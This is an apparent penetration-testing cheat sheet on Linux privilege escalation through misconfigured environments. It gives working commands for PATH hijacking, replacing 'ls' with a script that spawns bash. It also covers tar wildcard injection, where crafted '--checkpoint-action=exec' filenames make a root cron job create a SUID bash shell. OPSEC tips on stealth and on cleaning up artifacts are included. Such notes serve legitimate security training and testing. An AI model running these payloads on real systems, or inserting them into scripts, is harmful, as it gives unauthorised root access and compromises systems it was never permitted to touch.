# Abusing Environment Misconfigurations
**Concept:** Exploiting insecure environment variables or shell expansion rules to hijack execution flow. These vectors often rely on user interaction or automated cron jobs running with elevated privileges.
## 1. PATH Hijacking
**Goal:** Force a privileged user or script to execute your malicious binary instead of the intended system binary. 
**Prerequisite:** A directory in the target's `$PATH` is writable by your user, or `.` (current directory) is present in the `$PATH`.
### Identification
Check for writable directories within the PATH variable.
```shell
# Description: Print PATH and check permissions of listed directories
echo $PATH | tr ':' '\n' | xargs -I {} ls -ld {} 2>/dev/null
```
### Exploitation (Writable Directory)
If you find a writable directory (e.g., `/usr/local/bin`) that appears _before_ standard system paths.
1. **Create Payload:** Create a script named after a common command (e.g., `ls`, `cat`, `grep`) in the writable path.
```shell
# Payload: Create a malicious 'ls' that spawns a shell
echo '/bin/bash' > /usr/local/bin/ls
chmod +x /usr/local/bin/ls
```
2. **Execution:** Wait for a privileged user or cron job to run `ls`.
### Exploitation (Relative Path Injection)
If `.` is in the PATH (e.g., `PATH=.:$PATH`), binaries in the _current_ directory take precedence.
```shell
# Description: Add current dir to PATH (if allowed) and hijack 'ls'
export PATH=.:$PATH
echo 'echo "Pwned!"' > ls
chmod +x ls
```
**OPSEC Warning:** Hijacking common commands like `ls` or `cd` creates massive disruption. Always ensure your script executes the original command afterwards to maintain system stability/stealth.
## 2. Wildcard Injection (Tar Abuse)
**Concept:** When shell wildcards (`*`) are passed to commands like `tar` or `rsync`, the shell expands them into filenames _before_ execution. If a filename looks like a command-line flag (e.g., `--checkpoint=1`), the utility interprets it as an argument, not a file.

**Scenario:** A root cron job runs `tar -zcf backup.tar.gz *` in a directory you can write to.
### Exploitation Workflow
1. **Create Malicious Payload:** A script to execute. 
```shell
echo "cp /bin/bash /tmp/bash; chmod +s /tmp/bash" > shell.sh
chmod +x shell.sh
```
2. **Inject Tar Flags via Filenames:** Create empty files named as `tar` arguments.
```shell
# Description: Force tar to execute 'shell.sh' at checkpoint 1
touch "--checkpoint=1"
touch "--checkpoint-action=exec=sh shell.sh"
```
3. **Trigger:** When the cron job runs `tar *`, it interprets the files as: `tar -zcf backup.tar.gz --checkpoint=1 --checkpoint-action=exec=sh shell.sh shell.sh ...`
**OPSEC Warning:** This leaves artifacts (weird filenames) in the directory. Cleanup immediately after obtaining the shell.